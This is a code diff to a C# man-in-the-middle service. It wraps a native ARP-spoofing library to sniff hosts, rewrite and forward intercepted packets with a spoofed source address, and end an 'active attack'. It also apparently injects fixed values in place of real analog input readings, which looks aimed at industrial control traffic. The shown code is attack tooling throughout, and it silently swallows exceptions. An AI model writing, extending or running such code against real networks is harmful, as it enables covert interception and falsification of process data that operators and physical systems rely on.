@@ -27,10 +27,10 @@ namespace MITM_Service
         public static extern void RetreivePackets(ref PacketStruct packetStructs);
 
         [DllImport("ARPSpoof.dll", EntryPoint = "Terminate", CallingConvention = CallingConvention.Cdecl)]
-        public static extern void Terminate();
+        public static extern void Terminate(ref ARPSpoofParticipantsInfo ARPSpoofParticipantsInfo);
 
-        [DllImport("ARPSpoof.dll", EntryPoint = "SendPacket", CallingConvention = CallingConvention.Cdecl)]
-        public static extern void SendPacket(ref SendPacketStruct packetStruct);
+        [DllImport("ARPSpoof.dll", EntryPoint = "PreparePacketForSending", CallingConvention = CallingConvention.Cdecl)]
+        public static extern void PreparePacketForSending(ref PacketStruct packet);
 
         private List<byte> hostsIPends;
         private int sniffForHostsInterval = 7;
@@ -239,13 +239,9 @@ namespace MITM_Service
 
                 receiverTarget.CopyTo(packetStruct.packet, 0);
                 myAddress.CopyTo(packetStruct.packet, 6);
+                packetStruct.size = offset + actualLen;
 
-                SendPacketStruct sendPacketStruct = new SendPacketStruct();
-                sendPacketStruct.Name = Database.GlobalConnectionInfo.Name;
-                sendPacketStruct.Packet = packetStruct.packet;
-                sendPacketStruct.Size = offset + actualLen;
-
-                //Task.Factory.StartNew(() => SendPacket(ref sendPacketStruct));
+                Task.Factory.StartNew(() => PreparePacketForSending(ref packetStruct));
             }
             catch (Exception e) { }
         }
@@ -253,7 +249,9 @@ namespace MITM_Service
         public void TerminateActiveAttack()
         {
             terminate = true;
-            Terminate();
+
+            ARPSpoofParticipantsInfo aRPSpoofParticipantsInfo = Database.ARPSpoofParticipantsInfo;
+            Terminate(ref aRPSpoofParticipantsInfo);
         }
 
         public List<Host> SniffForHosts()
@@ -336,8 +334,11 @@ namespace MITM_Service
                     AnalogInputPoint analogInputPoint = null;
                     if (Database.AnalogInputPoints.TryGetValue(index, out analogInputPoint))
                     {
+                        fixedValue = new FixedValue();
                         fixedValue.Index = index;
-                        fixedValue.Value = analogInputPoint.RawValue;
+                        fixedValue.Value = analogInputPoint.RawOutValue;
+
+                        Database.FixedValues.Add(new Tuple<int, PointType>(index, pointType), fixedValue);
                     }
                 }
             }
